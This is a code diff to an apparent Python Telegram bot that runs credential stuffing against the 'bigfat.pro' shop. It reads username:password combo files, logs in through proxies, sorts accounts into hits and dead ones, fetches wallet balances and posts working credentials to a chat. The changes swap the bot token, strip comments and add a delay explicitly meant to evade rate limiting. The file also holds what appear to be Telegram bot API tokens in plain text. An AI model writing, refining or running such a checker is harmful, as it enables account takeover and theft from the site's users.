@@ -1,10 +1,11 @@
 import telebot
 import os
 import requests
+import time
 from telebot import types
 
 # Your bot's API key from Telegram
-api = '7626493889:AAHERZUnMu6Qbms5bWpggooESfyWETvUMRU'
+api = '7707030220:AAEtkUvnL4MlsShLckfG1LMm0QBOKWK42yg'
 bot = telebot.TeleBot(api)
 
 class BigfatCCShop:
@@ -31,7 +32,7 @@ class BigfatCCShop:
         response = self.session.post(login_url, data=data, headers=headers, proxies=self.proxies)
 
         if "https://bigfat.pro/cart" in response.text:
-            return "hit", response.text  # Returning status and response text for Status
+            return "hit", response.text
         elif "No match for Nickname and/or Password." in response.text:
             return "dead", response.text
         elif any(ban_key in response.text for ban_key in ["try again", "You are being rate limited", "1015"]):
@@ -66,7 +67,6 @@ class BigfatCCShop:
 
         response = self.session.get(logout_url, headers=headers, proxies=self.proxies)
 
-        # Return logout status message for Status2
         if response.status_code == 200:
             return "[SUCCESS] Logged out successfully"
         else:
@@ -78,7 +78,6 @@ def send_message_chunked(chat_id, message_text):
     if len(message_text) <= max_message_length:
         bot.send_message(chat_id, message_text)
     else:
-        # Split the message into chunks
         for i in range(0, len(message_text), max_message_length):
             bot.send_message(chat_id, message_text[i:i + max_message_length])
 
@@ -103,28 +102,30 @@ def process_file(file_path, chat_id, message_id):
             total += 1
             username, password = line.strip().split(":")
             account = BigfatCCShop(username, password)
-            status, login_response = account.login()  # Capturing the login response for Status
+            status, login_response = account.login()
 
             if status == "hit":
                 hits += 1
                 balance = account.get_wallet_balance()
-                logout_status = account.logout()  # Capturing the logout response for Status2
-                # Prepare and send the message in chunks
-                message_text = f"User » {username}\nPass » {password}\nStatus » Login Sucsesfull\nStatus2 » {logout_status}\nBalance » {balance}\nDev » @SmokeCigrette"
+                logout_status = account.logout()
+                message_text = f"User » {username}\nPass » {password}\nStatus » Login Done\nStatus2 » {logout_status}\nBalance » {balance}\nDev » @SmokeCigrette"
                 send_message_chunked(chat_id, message_text)
             elif status == "good":
                 good += 1
                 balance = account.get_wallet_balance()
-                logout_status = account.logout()  # Capturing the logout response for Status2
-                # Prepare and send the message in chunks
-                message_text = f"User » {username}\nPass » {password}\nStatus » Login Suscsefull\nStatus2 » {logout_status}\nBalance » {balance}\nDev » @SmokeCigrette"
+                logout_status = account.logout()
+                message_text = f"User » {username}\nPass » {password}\nStatus » Login Done\nStatus2 » {logout_status}\nBalance » {balance}\nDev » @SmokeCigrette"
                 send_message_chunked(chat_id, message_text)
             elif status == "dead":
                 dead += 1
             elif status == "error":
                 errors += 1
 
+            # Update keyboard
             update_keyboard(chat_id, total, hits, good, dead, errors, message_id)
+
+            # Add delay to avoid hitting rate limit
+            time.sleep(1.5)
 
 # Start Command Handler
 @bot.message_handler(commands=['start'])
@@ -143,7 +144,7 @@ def handle_file(message):
         with open(file_path, 'wb') as file:
             file.write(downloaded_file)
 
-        bot.send_message(message.chat.id, "File received. Checking started...")
+        bot.reply_to(message, "File received. Checking started...")
         markup = types.InlineKeyboardMarkup()
         total_button = types.InlineKeyboardButton("Total: 0", callback_data='total')
         hit_button = types.InlineKeyboardButton("Hits: 0", callback_data='hit')
@@ -152,8 +153,8 @@ def handle_file(message):
         error_button = types.InlineKeyboardButton("Errors: 0", callback_data='error')
         markup.add(total_button, hit_button, good_button, dead_button, error_button)
 
-        msg = bot.send_message(message.chat.id, "Your Combos Checking Started", reply_markup=markup)
-        process_file(file_path, message.chat.id, msg.message_id)
+        msg = bot.reply_to(message, "Your Combos Checking Started", reply_markup=markup)
+        process_file(file_path, message.chat.id, msg.id)  # Pass msg.id (integer) instead of msg.message_id
 
     except Exception as e:
         bot.reply_to(message, f"Error occurred: {str(e)}")
@@ -172,5 +173,5 @@ def callback_inline(call):
     elif call.data == 'error':
         bot.answer_callback_query(call.id, "Error occurred while processing some accounts.")
 
-# Run the bot
-bot.polling()
+# Run the bot with rate-limited polling
+bot.polling(none_stop=True, interval=2, allowed_updates=['message', 'callback_query'])
